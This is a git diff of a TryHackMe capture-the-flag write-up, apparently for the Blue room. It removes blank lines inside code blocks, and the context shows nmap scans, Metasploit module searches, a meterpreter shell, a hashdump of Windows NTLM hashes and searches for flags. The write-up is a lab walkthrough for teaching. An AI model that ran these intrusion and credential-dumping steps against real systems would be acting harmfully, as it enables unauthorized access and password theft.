@@ -23,7 +23,6 @@ Badges: [https://tryhackme.com/ZishanAdThandar/badges/blue](https://tryhackme.co
 Output:
 
 ```bash
-
 Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-27 10:57 IST
 Nmap scan report for 10.10.248.180
 Host is up (0.20s latency).
@@ -64,7 +63,6 @@ Nmap done: 1 IP address (1 host up) scanned in 34.07 seconds
 Output:
 
 ```bash
-
 Matching Modules
 ================
 
@@ -93,7 +91,6 @@ Interact with a module by name or index. For example info 4, use 4 or use exploi
 Output:
 
 ```bash
-
 Matching Modules
 ================
 
@@ -110,7 +107,6 @@ Interact with a module by name or index. For example info 0, use 0 or use post/m
 - Run the module after setting session. If fails run it again, it will connect.
 
 ```bash
-
 meterpreter > shell
 Process 808 created.
 Channel 1 created.
@@ -150,7 +146,6 @@ Process List
 Output:
 
 ```bash
-
 meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -166,7 +161,6 @@ Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 - We can goto `C:\\` abd get first flag using `cat flag1.txt`.
 
 ```bash
-
 meterpreter > pwd
 C:\Windows\system32
 meterpreter > cd C:\\
@@ -197,7 +191,6 @@ flag{********************************}
 - We can use `search -f flag2.txt` and `search -f flag2.txt` to find second and third flag to submit, as we already know the first one.
 
 ```bash
-
 meterpreter > search -f flag2.txt
 Found 1 result...
 =================
